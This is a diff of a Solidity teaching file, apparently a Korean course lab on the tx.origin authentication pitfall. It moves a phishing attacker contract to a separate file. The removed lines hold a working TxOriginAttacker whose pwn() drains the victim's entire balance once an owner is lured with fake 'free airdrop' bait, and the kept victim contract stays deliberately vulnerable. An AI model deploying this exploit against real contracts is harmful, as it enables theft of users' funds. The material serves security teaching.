@@ -2,11 +2,13 @@
 pragma solidity ^0.8.24;
 
 /**
- * @title TxOriginVictim / TxOriginAttacker
- * @dev Ch13 실습 — tx.origin 함정
+ * @title TxOriginVictim
+ * @dev Ch13 실습 — tx.origin 함정 (피해자 컨트랙트)
  *
- * ❌ 취약점: tx.origin으로 인증하면 피싱 컨트랙트를 통해 우회 가능
+ * ❌ 취약점: tx.origin으로 인증하면 피싱 컨트랙트(TxOriginAttacker.sol)를 통해 우회 가능
  * ✅ 방어: msg.sender 사용
+ *
+ * 짝 파일: `TxOriginAttacker.sol` (같은 폴더). 공격 시나리오는 그 파일 참조.
  */
 contract TxOriginVictim {
     address public owner;
@@ -34,25 +36,5 @@ contract TxOriginVictim {
 
     receive() external payable {
         balance += msg.value;
-    }
-}
-
-// ── 피싱 공격 컨트랙트 ─────────────────────────────
-contract TxOriginAttacker {
-    TxOriginVictim public victim;
-    address payable public attacker;
-
-    constructor(address _victim) {
-        victim = TxOriginVictim(payable(_victim));
-        attacker = payable(msg.sender);
-    }
-
-    /**
-     * @dev owner가 이 함수를 호출하도록 유도(피싱):
-     *      "무료 에어드롭 받기" 같은 미끼로 owner를 낚음
-     *      실행 시 victim.badWithdraw가 tx.origin=owner로 통과됨
-     */
-    function pwn() external {
-        victim.badWithdraw(attacker, address(victim).balance);
     }
 }
